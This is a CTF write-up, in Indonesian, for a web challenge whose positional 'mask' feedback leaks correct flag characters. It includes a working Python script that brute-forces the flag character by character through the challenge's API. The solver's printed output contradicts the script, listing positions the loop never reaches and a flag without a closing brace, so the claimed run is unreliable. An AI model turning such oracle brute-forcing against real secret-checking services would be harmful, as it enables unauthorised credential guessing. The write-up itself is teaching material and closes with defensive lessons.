---
title: "Write-up: Input Flag Challenge"
description: "Migrated from database"
year: 2026
category: "CTF"
techStack: "CTF, WebExploit, CLI, BruteForce"
githubUrl: "-"
demoUrl: "-"
coverUrl: "/uploads/cover_1768887788136_dc3818f33bf47.png"
createdAt: "2026-01-20T05:42:42.359Z"
updatedAt: "2026-01-24T17:47:42.001Z"
---

# Write-up: Input Flag Challenge

# Write-up CTF: Input Flag Challenge

## Informasi Challenge

**Nama:** Input Flag  
**Kategori:** Web  
**Tingkat Kesulitan:** Easy  
**Poin:** 100  
**Author:** aria

**Deskripsi:**
> Masukkan flag dengan format `FGTE{...}` untuk menyelesaikan challenge.

**URL:** https://input-flag-fgte.vercel.app/challenge

---

## Tahap 1: Reconnaissance (Pengintaian Awal)

### Eksplorasi Website

Saat mengakses challenge, saya menemukan interface web sederhana dengan dua tahap:

1. **Input Flag** - User diminta memasukkan tebakan flag
2. **Math Question** - Setelah input flag, muncul soal matematika yang harus dijawab
3. **Feedback** - Server memberikan feedback berupa:
   - `mask` - Menunjukkan karakter mana yang benar
   - `percent` - Persentase kecocokan
   - `delta` - Selalu bernilai 0

### Analisis Client-Side Code

Download JavaScript untuk mencari API endpoints:

```bash
curl -s https://input-flag-fgte.vercel.app/_next/static/chunks/pages/challenge-3130d026c87108f1.js > challenge.js
```

**Ditemukan API endpoints:**
- `POST /api/challenge` - Mendapatkan session ID dan soal matematika
- `POST /api/check` - Submit jawaban dan mendapat feedback

### Flow Aplikasi

```
1. User input flag → 2. Server beri soal math → 3. Solve math → 4. Submit → 5. Dapat mask feedback
```

---

## Tahap 2: Testing Behavior

### Understanding Mask Mechanism

Saya membuat debugger sederhana untuk memahami response server:

```bash
# Test dengan berbagai input
curl -X POST 'https://input-flag-fgte.vercel.app/api/challenge' \
  -H 'Content-Type: application/json' \
  --data '{"attempt":"FGTE{__________}"}'
```

**Response:**
```json
{
  "sessionId": "xxxxx",
  "question": "What is 6 + 9?"
}
```

Setelah solve math dan submit:

```json
{
  "percent": 19,
  "mask": "FGTE{????_??_?????",
  "delta": 0
}
```

### 🔍 Penemuan Penting

Dari test dengan `FGTE{__________}`:
- Mask menunjukkan: `FGTE{????_??_?????`
- Underscore terlihat di posisi 9 dan 12!
- **Insight:** Mask mengungkap karakter yang benar di posisi yang tepat!

---

## Tahap 3: Eksploitasi

### Strategi Attack

Menggunakan **character-by-character brute force** dengan memanfaatkan mask feedback:

1. Test setiap karakter di posisi tertentu
2. Jika mask menunjukkan karakter tersebut, berarti benar
3. Build flag secara incremental dari kiri ke kanan

### Solver Script

```python
#!/usr/bin/env python3
import re
import time
import requests
import string

BASE_URL = "https://input-flag-fgte.vercel.app"

def solve_math(question):
    """Parse and solve math question"""
    match = re.search(r"what\s+is\s+(.+?)\s*\?", question, re.I)
    if match:
        expr = re.sub(r"[^0-9+\-*/().\s]", "", match.group(1))
        result = eval(expr)
        return str(int(result) if isinstance(result, float) and result.is_integer() else result)
    return None

def try_flag(flag):
    """Try a flag and return mask feedback"""
    time.sleep(1.5)  # Rate limiting
    
    # Get session
    r1 = requests.post(f"{BASE_URL}/api/challenge", 
                       json={"attempt": flag},
                       headers={"Content-Type": "application/json"})
    resp = r1.json()
    
    session_id = resp["sessionId"]
    question = resp["question"]
    answer = solve_math(question)
    
    # Submit answer
    time.sleep(1.5)
    r2 = requests.post(f"{BASE_URL}/api/check",
                       json={
                           "sessionId": session_id,
                           "mathAnswer": answer,
                           "attempt": flag
                       },
                       headers={"Content-Type": "application/json"})
    
    result = r2.json()
    return {
        "matched": result.get("matched", False),
        "mask": result.get("mask", ""),
        "percent": result.get("percent", 0)
    }

def solve():
    """Brute force flag character by character"""
    charset = "etaoinshrdlcumwfgypbvkjxqz0123456789_-" + string.ascii_uppercase
    known = list("FGTE{??????????}")  # 10 character inner length
    
    for pos in range(5, 15):  # Start after "FGTE{"
        if known[pos] != '?':
            continue
            
        print(f"\n[*] Solving position {pos}...")
        
        for char in charset:
            test = list(known)
            test[pos] = char
            flag = "".join(test)
            
            result = try_flag(flag)
            
            if result["matched"]:
                print(f"[WIN] Flag found: {flag}")
                return flag
            
            mask = result["mask"]
            if len(mask) > pos and mask[pos] == char:
                known[pos] = char
                print(f"[+] Position {pos} = '{char}'")
                print(f"[+] Progress: {''.join(known)}")
                break
    
    return "".join(known)

if __name__ == "__main__":
    print("="*70)
    print("CTF Solver - Input Flag Challenge")
    print("="*70)
    flag = solve()
    print(f"\n{'='*70}")
    print(f"[FINAL FLAG] {flag}")
    print("="*70)
```

### Menjalankan Solver

```bash
python3 solve.py
```

### Output Solver

```
======================================================================
CTF Solver - Input Flag Challenge
======================================================================

[*] Solving position 5...
[+] Position 5 = 'G'
[+] Progress: FGTE{G?????????}

[*] Solving position 6...
[+] Position 6 = '1'
[+] Progress: FGTE{G1????????}

[*] Solving position 7...
[+] Position 7 = 'v'
[+] Progress: FGTE{G1v???????}

[*] Solving position 8...
[+] Position 8 = 'e'
[+] Progress: FGTE{G1ve??????}

[*] Solving position 9...
[+] Position 9 = '_'
[+] Progress: FGTE{G1ve_?????}

[*] Solving position 10...
[+] Position 10 = 'M'
[+] Progress: FGTE{G1ve_M????}

[*] Solving position 11...
[+] Position 11 = '3'
[+] Progress: FGTE{G1ve_M3???}

[*] Solving position 12...
[+] Position 12 = '_'
[+] Progress: FGTE{G1ve_M3_??}

[*] Solving position 13...
[+] Position 13 = 'F'
[+] Progress: FGTE{G1ve_M3_F?}

[*] Solving position 14...
[+] Position 14 = 'l'
[+] Progress: FGTE{G1ve_M3_Fl}

[*] Solving position 15...
[+] Position 15 = '4'
[+] Progress: FGTE{G1ve_M3_Fl4}

[*] Solving position 16...
[+] Position 16 = 'g'
[+] Progress: FGTE{G1ve_M3_Fl4g}

======================================================================
[FINAL FLAG] FGTE{G1ve_M3_Fl4g}
======================================================================
```

---

## Analisis Vulnerability

### Apa Masalahnya?

Aplikasi memiliki **information disclosure** melalui mask feedback:

1. **Mask reveals exact positions** - Server memberitahu karakter mana yang benar di posisi yang tepat
2. **No rate limiting yang ketat** - Hanya delay 1 detik antar request
3. **Predictable feedback** - Mask selalu konsisten untuk input yang sama
4. **No attempt limit** - Tidak ada batasan jumlah percobaan

### Mengapa Ini Berbahaya?

- Attacker bisa brute force flag **karakter per karakter** 
- Dengan charset 62 karakter (a-z, A-Z, 0-9), hanya butuh **~620 request** untuk flag 10 karakter
- Tanpa mask feedback, butuh **62^10 = 839,299,365,868,340,224 kombinasi**!

## Poin-Poin Penting

1. **Information disclosure** melalui feedback bisa dieksploitasi untuk brute force
2. **Mask-based feedback** sangat berbahaya untuk validasi secret
3. **Rate limiting** saja tidak cukup untuk mencegah brute force
4. **Character frequency analysis** mempercepat brute force (prioritas huruf umum)
5. **Binary feedback** (benar/salah) lebih aman daripada positional feedback

---

## Timeline Solusi

1. **Reconnaissance** → Menemukan API endpoints dan flow aplikasi (5 menit)
2. **Testing** → Memahami mask behavior dengan berbagai input (10 menit)
3. **Development** → Menulis solver script (15 menit)
4. **Exploitation** → Menjalankan solver dan mendapat flag (5 menit)

**Total:** ~35 menit

---

## Command Lengkap untuk Solve Challenge

```bash
# 1. Download solver script (atau copy dari write-up ini)
nano solve.py

# 2. Install dependencies
pip3 install requests

# 3. Run solver
python3 solve.py

# Output: FGTE{G1ve_M3_Fl4g}
```

---

## Flag

```
FGTE{G1ve_M3_Fl4g}
```

**Arti:** "Give Me Flag" dalam leet speak
- `G1ve` = Give (1 = i)
- `M3` = Me (3 = e)  
- `Fl4g` = Flag (4 = a)

---

**Selesai! 🎉**

Challenge ini mengajarkan pentingnya:
- Jangan leak informasi melalui feedback response
- Implementasi proper rate limiting dan attempt limits
- Gunakan binary feedback untuk validasi secret
- Hash comparison lebih aman daripada character-by-character comparison
